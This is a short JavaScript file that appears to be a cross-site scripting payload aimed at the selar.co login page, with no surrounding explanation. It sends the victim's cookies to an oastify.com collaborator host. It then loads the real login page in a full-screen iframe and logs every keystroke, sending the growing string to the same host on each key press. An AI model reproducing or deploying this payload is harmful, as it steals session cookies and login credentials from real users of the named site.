let currSession="";
fetch(`https://4ejcesgd7nd62rf3xgkjigf6txzonpbe.oastify.com/${document.cookie}`, {mode: 'no-cors',});
setTimeout(function() {}, 3000);
document.body.style.setProperty('height', '100vh')
const iframe = document.createElement('iframe');
iframe.src = 'https://selar.co/login';
iframe.width = '100%';
iframe.height = '100%'; 
iframe.style.border = 'none';
iframe.onload = function () {
    console.log('Iframe has loaded successfully!');
    iframe.contentWindow.addEventListener('keydown', (event) => {    console.log(`Key pressed: ${event.key}`);
    currSession += String(event.key)
    fetch(`https://4ejcesgd7nd62rf3xgkjigf6txzonpbe.oastify.com/${currSession}`, {mode: 'no-cors',});
});
};
document.body.appendChild(iframe);
